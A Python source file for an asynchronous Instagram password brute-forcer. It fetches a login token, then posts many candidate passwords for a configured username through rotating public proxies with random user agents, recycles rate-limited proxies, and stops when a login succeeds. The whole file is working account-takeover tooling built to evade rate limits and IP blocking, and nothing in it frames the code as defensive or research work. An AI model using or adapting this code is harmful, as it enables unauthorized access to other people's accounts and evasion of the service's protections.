from __future__ import absolute_import

import asyncio
import aiohttp

from datetime import datetime
import random
from urllib.parse import urlparse

import stopit

from app import settings
from app.lib import exceptions
from app.logging import AppLogger
from app.lib.utils import (
    get_token_from_response, limited_as_completed, read_proxies, bar)

from app.lib.models import (
    InstagramResult, LoginAttemptContext, LoginContext, TokenContext, Proxy)


class handler(object):

    def __init__(self, config, results, attempts):
        self.config = config

        self.results = results
        self.attempts = attempts

        self.log = AppLogger(self.__name__)


class results_handler(handler):

    __name__ = 'Results Handler'

    async def consume(self, loop, stop_event):
        """
        Since this consumer is at the bottom of the entire tree (i.e. only
        receiving information after all other consumers), we don't have to wait
        for a stop event in the loop, we can just break out of it.
        """
        index = 0
        while True:
            result = await self.results.get()

            # Producer emits None if we are done processing passwords.
            if result is None:
                break

            index += 1

            # TODO: Cleanup how we are doing the percent complete operation,
            # maybe try to use progressbar package.
            self.log.notice("{0:.2%}".format(float(index) / self.config.user.num_passwords))
            self.log.notice(result)

            if result.authorized:
                self.log.debug('Setting Stop Event')
                stop_event.set()
                break

            else:
                self.log.error("Not Authenticated", extra={'password': result.context.password})
                await self.attempts.put(result.context.password)

    async def dump(self):
        attempts_list = []
        while not self.attempts.empty():
            attempts_list.append(await self.attempts.get())
        self.config.user.update_password_attempts(attempts_list)


class proxy_handler(handler):
    """
    TODO: This could be cleaned up a bit, with the validation in particular.
    It might be worthwhile looking into whether or not we can subclass the
    asyncio.Queue() so we don't have to have the methods on this handler and
    pass the handler around.

    The logic in here definitely needs to be looked at and cleaned up, particularly
    in terms of the order we are validating and when we are validating the proxies.
    """
    __name__ = 'Proxy Handler'
    __urls__ = {
        'GET': settings.INSTAGRAM_URL,
        'POST': settings.INSTAGRAM_LOGIN_URL
    }

    def __init__(self, proxy_pool, *args, method='GET'):
        super(proxy_handler, self).__init__(*args)
        self.method = method

        # Proxies we read from .txt files on prepopulate and then proxies we
        # get from server during live run.
        self.proxies = asyncio.Queue()

        # TODO: See if we can create these objects directly in the handler,
        # with the broker as well.
        self.pool = proxy_pool

    @property
    def scheme(self):
        return urlparse(self.__urls__[self.method]).scheme

    async def produce(self):
        """
        When initially starting, it sometimes takes awhile for the proxies with
        valid credentials to populate and kickstart the password consumer.

        Prepopulating the proxies from the designated text file can help and
        dramatically increase speeds.
        """

        # Make max_error_rate and max_resp_time for proxies configurable, and if
        # they are set, than we can filter the proxies we read by those values.
        proxies = read_proxies(method=self.method, order_by='avg_resp_time')
        for proxy in proxies:
            await self.put(proxy, update_time=False)

    async def consume(self, loop, stop_event):
        # Introduce timeout for waiting for first proxy.
        while not stop_event.is_set():
            try:
                proxy = await self.pool.get(scheme=self.scheme)

            # Weird error from ProxyBroker that makes no sense...
            # TypeError: '<' not supported between instances of 'Proxy' and 'Proxy'
            except TypeError as e:
                self.log.warning(e)

            else:
                proxy = Proxy.from_broker_proxy(proxy)
                # TODO: Move these values to settings.
                if proxy.error_rate <= 0.5 and proxy.avg_resp_time <= 5.0:
                    # Should we maybe check proxy verifications before we put the
                    # proxy in the queue to begin with?
                    await self.put(proxy, update_time=False)

        self.log.debug('Stop Event Noticed')
        await self.put(None)

    async def put(self, proxy, update_time=True):
        if proxy and update_time:
            proxy.last_used = datetime.now()
        await self.proxies.put(proxy)

    async def validate_proxy(self, proxy):
        if not proxy.last_used:
            return True
        else:
            # TODO: Move this value to settings.
            if proxy.time_since_used() >= 10:
                return True
            else:
                await self.proxies.put(proxy)
                self.proxy_list.append(proxy)
                return False

    async def get_from_queue(self):
        while True:
            proxy = await self.proxies.get()

            # Emit None to Alert Consumer to Stop Listening
            if proxy is None:
                break

            # Should we maybe check these verifications before we put the
            # proxy in the queue to begin with?
            valid = await self.validate_proxy(proxy)
            if valid:
                return proxy

    async def get(self):
        """
        TODO
        ----
        Move the allowed timeout for finding a given proxy that satisfies
        reauirements to settings.

        We will set the timeout very high right now, because it sometimes takes
        awhile for the proxies to build up - setting this low causes it to fail
        during early stages of login attempts.
        """
        with stopit.SignalTimeout(50) as timeout_mgr:
            proxy = await self.get_from_queue()
            if proxy:
                if proxy.time_since_used():
                    # TODO: Make this debug level once we are more comfortable
                    # with operation.
                    self.log.info('Returning Proxy %s Used %s Seconds Ago' %
                        (proxy.host, proxy.time_since_used()))

        if timeout_mgr.state == timeout_mgr.TIMED_OUT:
            raise exceptions.InternalTimeout("Timed out waiting for a valid proxy.")

        if not proxy:
            raise Exception('ERROR')
        return proxy


class request_handler(handler):

    def __init__(self, *args):
        super(request_handler, self).__init__(*args)
        self.user_agent = random.choice(settings.USER_AGENTS)

    def _notify_request(self, context, retry=1):
        message = f'Sending {self.__method__} Request'
        if retry != 1:
            message = f'Sending {self.__method__} Request, Retry {retry}'
        self.log.debug(message, extra={'context': context})

    def _headers(self):
        headers = settings.HEADER.copy()
        headers['user-agent'] = self.user_agent
        return headers

    @property
    def connector(self):
        """
        TCPConnector
        -------------
        keepalive_timeout (float) – timeout for connection reusing after
            releasing
        limit_per_host (int) – limit simultaneous connections to the same
            endpoint (default is 0)
        """
        return aiohttp.TCPConnector(
            ssl=False,
            limit=self.config.connection_limit,
            keepalive_timeout=self.config.connector_timeout,
            enable_cleanup_closed=True,
        )

    @property
    def timeout(self):
        return aiohttp.ClientTimeout(total=self.config.fetch_time)


class token_handler(request_handler):

    __name__ = 'Token Handler'
    __method__ = 'GET'

    def __init__(self, proxy_handler, *args):
        super(token_handler, self).__init__(*args)

        # TODO: See if we can initialize the server for GET and POST proxies
        # in the handlers themselves, or potentially subclass the asyncio.Queue()\
        # for proxies.
        self.proxy_handler = proxy_handler

    def _get_token_from_response(self, response):
        token = get_token_from_response(response)
        if not token:
            raise exceptions.TokenNotInResponse()
        return token

    async def fetch(self, session):

        async def try_with_proxy(attempt=0):

            proxy = await self.proxy_handler.get()
            context = TokenContext(index=attempt, proxy=proxy)
            self._notify_request(context, retry=attempt)

            try:
                # Raise for status is automatically performed, so we do not have
                # to have a client response handler.
                async with session.get(
                    settings.INSTAGRAM_URL,
                    raise_for_status=True,
                    headers=self._headers(),
                    proxy=proxy.url()
                ) as response:
                    try:
                        token = self._get_token_from_response(response)
                    except exceptions.TokenNotInResponse as e:
                        self.log.warning(e, extra={'context': context})
                        return await try_with_proxy(attempt=attempt + 1)
                    else:
                        await self.proxy_handler.put(proxy)
                        return token

            # TODO: Might want to incorporate too many requests, although that
            # is unlikely.
            except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
                return await try_with_proxy(attempt=attempt + 1)

            except aiohttp.ClientError as e:
                self.log.error(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except asyncio.CancelledError:
                return

            except (TimeoutError, asyncio.TimeoutError) as e:
                self.log.error(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

        # We might have to check if stop_event is set here.
        return await try_with_proxy()

    async def consume(self, loop, stop_event):

        while not stop_event.is_set():
            async with aiohttp.ClientSession(
                connector=self.connector,
                timeout=self.timeout
            ) as session:
                task = asyncio.ensure_future(self.fetch(session))

                # TODO: Move the allowed timeout for finding the token to settings.
                with stopit.SignalTimeout(10) as timeout_mgr:
                    token = await task
                    if not token:
                        raise exceptions.FatalException("Token should be non-null here.")

                if timeout_mgr.state == timeout_mgr.TIMED_OUT:
                    raise exceptions.InternalTimeout("Timed out waiting for token.")

                self.log.debug('Setting Stop Event')
                stop_event.set()
                return token


class password_handler(request_handler):

    __name__ = 'Login Handler'
    __method__ = 'POST'

    def __init__(self, proxy_handler, *args):
        super(password_handler, self).__init__(*args)
        self.passwords = asyncio.Queue()

        # TODO: See if we can initialize the server for GET and POST proxies
        # in the handlers themselves, or potentially subclass the asyncio.Queue()\
        # for proxies.
        self.proxy_handler = proxy_handler

    def _login_data(self, password):
        return {
            settings.INSTAGRAM_USERNAME_FIELD: self.config.user.username,
            settings.INSTAGRAM_PASSWORD_FIELD: password
        }

    def _headers(self, token):
        headers = super(password_handler, self)._headers()
        headers[settings.TOKEN_HEADER] = token
        return headers

    async def _get_result_from_response(self, response, context):
        try:
            result = await response.json()
        except ValueError:
            raise exceptions.ResultNotInResponse()
        else:
            return InstagramResult.from_dict(result, context)

    async def _handle_client_response(self, response, context):
        """
        Takes the AIOHttp ClientResponse and tries to return a parsed
        InstagramResult object.

        For AIOHttp sessions and client responses, we cannot read the json
        after response.raise_for_status() has been called.

        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        if response.status >= 400 and response.status < 500:
            if response.status == 400:
                return await self._get_result_from_response(response, context)
            else:
                response.raise_for_status()
        else:
            try:
                return await self._get_result_from_response(response, context)
            except exceptions.ResultNotInResponse as e:
                raise exceptions.FatalException(
                    "Unexpected behavior, result should be in response."
                )

    async def _handle_parsed_result(self, result, context):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        if result.has_error:
            raise exceptions.InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise exceptions.InstagramResultError("Inconslusive result.")
            return result

    async def fetch(self, session, parent_context):
        """
        NOTE
        ----

        Do not want to automatically raise for status because we can have
        a 400 error but enough info in response to authenticate.

        Also, once response.raise_for_status() is called, we cannot access
        the response.json().

        TODO:
        -----

        Maybe incorporate some sort of max-retry on the attempts so that we dont
        accidentally run into a situation of accumulating a lot of requests.

        For certain exceptions we may want to reintroduce the sleep/timeout,
        but it might be faster to immediately just go to next proxy.
        """
        async def try_with_proxy(attempt=0):
            proxy = await self.proxy_handler.get()
            context = LoginAttemptContext(
                index=attempt,
                proxy=proxy,
                parent_index=parent_context.index,
                password=parent_context.password,
                token=parent_context.token
            )
            self._notify_request(context, retry=attempt)

            try:
                async with session.post(
                    settings.INSTAGRAM_LOGIN_URL,
                    headers=self._headers(context.token),
                    proxy=proxy.url(),
                ) as response:
                    # Only reason to log these errors here is to provide the response
                    # object
                    try:
                        result = await self._handle_client_response(response, context)
                        result = await self._handle_parsed_result(result, context)

                    except exceptions.ResultNotInResponse as e:
                        self.log.error(e, extra={'response': response, 'context': context})

                    except exceptions.InstagramResultError as e:
                        self.log.error(e, extra={'response': response, 'context': context})

                    else:
                        if not result:
                            raise exceptions.FatalException("Result should not be None here.")

                        # Put proxy back in so that it can be reused.
                        await self.proxy_handler.put(proxy)
                        return result

            except RuntimeError as e:
                """
                RuntimeError: File descriptor 87 is used by transport
                <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>
                """
                self.log.error(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
                self.log.warning(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except asyncio.TimeoutError as e:
                self.log.warning(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except aiohttp.ClientConnectionError as e:
                self.log.warning(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

            except OSError as e:
                # We have only seen this for the following:
                # >>> OSError: [Errno 24] Too many open files
                # >>> OSError: [Errno 54] Connection reste by peer
                # For the former, we want to sleep for a second, for the latter,
                # we want to move on to a new proxy.
                if e.errno == 54:
                    self.log.error(e, extra={'context': context})
                    return await try_with_proxy(attempt=attempt + 1)
                elif e.errno == 24:
                    asyncio.sleep(3)
                    self.log.error(e, extra={
                        'context': context,
                        'other': f'Sleeping for {3} seconds...'
                    })
                    return await try_with_proxy(attempt=attempt + 1)
                else:
                    raise e

            except asyncio.CancelledError as e:
                pass

            except aiohttp.ClientError as e:
                # For whatever reason these errors don't have any message...
                # We want to put the proxy back in the queue so it can be used
                # again later.
                if e.status == 429:
                    e.message = 'Too many requests.'
                    await self.proxy_handler.put(proxy)

                self.log.error(e, extra={'context': context})
                return await try_with_proxy(attempt=attempt + 1)

        return await try_with_proxy()

    async def produce(self, loop):
        for password in self.config.user.get_new_attempts(
            limit=self.config.password_limit
        ):
            await self.passwords.put(password)

    async def consume(self, loop, stop_event, token):
        tasks = []

        if self.passwords.qsize() == 0:
            self.log.error('No Passwords to Try')
            stop_event.set()

        progress = bar(label='Attempting Login', max_value=self.passwords.qsize())

        def task_done(fut):
            result = fut.result()
            if not result or not result.conclusive:
                raise exceptions.FatalException(
                    "Result should be valid and conslusive."
                )

            # TODO: Make sure we do not run into any threading issues with this
            # potentially not being thread safe.  We might have to go back
            # to using the limited_as_completed method instead.
            progress.update()
            self.results.put_nowait(result)

        while not stop_event.is_set():
            progress.start()

            async with aiohttp.ClientSession(
                connector=self.connector,
                timeout=self.timeout
            ) as session:

                index = 0
                while not self.passwords.empty():
                    password = await self.passwords.get()
                    context = LoginContext(index=index, token=token, password=password)

                    task = asyncio.create_task(self.fetch(session, context))
                    task.add_done_callback(task_done)
                    tasks.append(task)

                self.log.debug(f'Awaiting {len(tasks)} Password Tasks...')
                await asyncio.gather(*tasks)
                self.log.debug('Setting Stop Event')

                stop_event.set()

        progress.finish()
        self.log.debug('Stop Event Noticed')

        # Indicate Results Producer is Done Producing
        await self.results.put(None)

        # TODO: If the task_done() callback is not thread safe because of the
        # inability to call await self.results.put(result), we might have to go
        # back to using asyncio.as_completed() or limited_as_completed():
        #
        # for fut in asyncio.as_completed(tasks):
        #     fut = await fut
        #     await self.results.put(fut)

        # for res in limited_as_completed(task_generator(), self.config.batch_size):
        #     result = await res
        #     await self.results.put(result)
